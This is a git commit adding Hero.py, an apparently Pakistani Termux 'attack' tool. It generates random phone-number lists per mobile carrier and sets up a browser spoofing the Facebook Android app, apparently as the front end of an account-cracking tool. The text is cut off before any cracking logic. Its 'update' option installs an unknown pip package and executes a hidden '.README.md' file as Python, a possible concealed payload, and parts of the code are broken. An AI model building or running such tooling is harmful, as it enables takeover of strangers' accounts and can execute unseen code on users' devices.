d65ef8e2542478cefdfad5cc82eaf6cc665ac1d3
Arshad khan <65166374+T46484@users.noreply.github.com>
2022-02-05 13:19:10 +0500

    Create Hero.py
    https://github.com/T46484/Hero.git
    ls 
    cd Arsh
    ls
    Python2 Hero.py

---
+++ Hero.py
@@ -0,0 +1,194 @@
+#!/usr/bin/python2
+#coding=utf-8
+#The Credit For This Code Goes To Pathani Rimish
+#If You Wanna Take Credits For This Code, Please Look Yourself Again...
+#Reserved2020
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
+os.system('rm -rf .txt')
+for n in range(50000):
+ 
+    nmbr = random.randint(1111111, 9999999)
+    
+    sys.stdout = open('.txt', 'a')
+ 
+    print(nmbr)
+ 
+    sys.stdout.flush()
+    
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+    
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(1)
+    os.system('python2 nmbr.py')
+    
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+ 
+ 
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+def exb():
+	print '[!] Exit'
+	os.sys.exit()
+ 
+def psb(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.03)
+ 
+def t():
+    time.sleep(1)
+def cb():
+    os.system('clear')
+##### Dev : HAMII#####
+##### LOGO ####
+logo = """
+
+\033[1;92m _____     _     _
+|  ___|_ _(_)___(_)
+\033[1;96m| |_ / _` | |_  / |
+|  _| (_| | |/ /| |
+\033[1;97m|_|  \__,_|_/___|_|
+
+
+\033[1;37m--------------------------------------------------
+\033[1;96m➣ OWNER  Arshad Khan
+\033[1;94m➣ Facebook  Arshad khan
+\033[1;37m--------------------------------------------------
+"""
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+def menu():
+	os.system('clear')
+	print logo
+	print "\033[1;92mWLcM to Hero Termux Commands"
+	print
+        print "\033[1;91mATTACK ON PAKISTAN NETWORKS"
+	print "\033[1;92m[1]  MOBILINK"
+	print "\033[1;92m[2]  TELINOR"
+	print "\033[1;92m[3]  WARID"
+	print "\033[1;92m[4]  UFONE"
+	print "\033[1;92m[5]  ZONG"
+	print "\033[1;92m[6]  UPDATE SYSTEM"
+	print "\033[1;92m[0]  EXIT_KALTI MAR"	    
+	print 50*'-'
+	action()
+	
+def action():	
+	bch = raw_input('\n  ENTER HERE ANY NUMBER ')
+	if bch =='':
+		print '[!] Fill in correctly'
+		action()
+	elif bch =="1":
+		os.system("clear")
+		print (logo)
+		print "\033[1;91mMOBILINK/JAZZ CODE HERE"		
+		print "\033[1;95m00, 01, 02, 03, 04,"
+		print "\033[1;95m05, 06, 07, 08, 09,"
+		try:
+			c = raw_input(" SELECTED CODE: ")
+			k="03"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif bch =="2":			
+		os.system("clear")
+		print (logo)
+		print "\033[1;91mTELINORE CODE HERE"		
+		print "\033[1;94m40, 41, 42, 43, 44,"
+		print "\033[1;95m45, 64, ??, ??, ??,"
+		try:
+			c = raw_input(" SELECTED CODE: ")
+			k="+923"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif bch =="3":			
+		os.system("clear")
+		print (logo)
+		print "\033[1;91mWARID CODE HERE"		
+		print "\033[1;94m20, 21, 22, 23,"
+		print "\033[1;95m24, ??, ??, ??,"
+		try:
+			c = raw_input(" SELECTED CODE: ")
+			k="+923"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()	
+	elif bch =="4":			
+		os.system("clear")
+		print (logo)
+		print "\033[1;91mUFONE CODE HERE"		
+		print "\033[1;94m31, 32, 33, 34,"
+		print "\033[1;95m35, 36, 37, ??,"
+		try:
+			c = raw_input(" SELECTED CODE: ")
+			k="+923"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()	
+	elif bch =="5":			
+		os.system("clear")
+		print (logo)
+		print "\033[1;91mZONG CODE HERE"		
+		print "\033[1;94m10, 11, 12, 13,"
+		print "\033[1;95m14, 15, 16, 17,"
+		try:
+			c = raw_input(" SELECTED CODE: ")
+			k="+923"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif bch =="6":
+	    os.system("clear")
+	    os.system("pip2 install --upgrade balln")
+	    os.system("pip2 install --upgrade balln")
+	    os.system("clear")
+	    print(logo)
+	    print
+	    psb (" Tool has been successfully updated")
+	    time.sleep(2)
+	    os.system("python2 .README.md")
+#	elif chb =='3':	
+#	    os.system('xdg-open https://www.facebook.com/100002059014174/posts/2677733205638620/?substory_index=0&app=fbl')
+#	    time.sleep(1)
+#	    menu()
+	elif bch =='0':
+		exb()
+	else:
+		print '[!] Fill
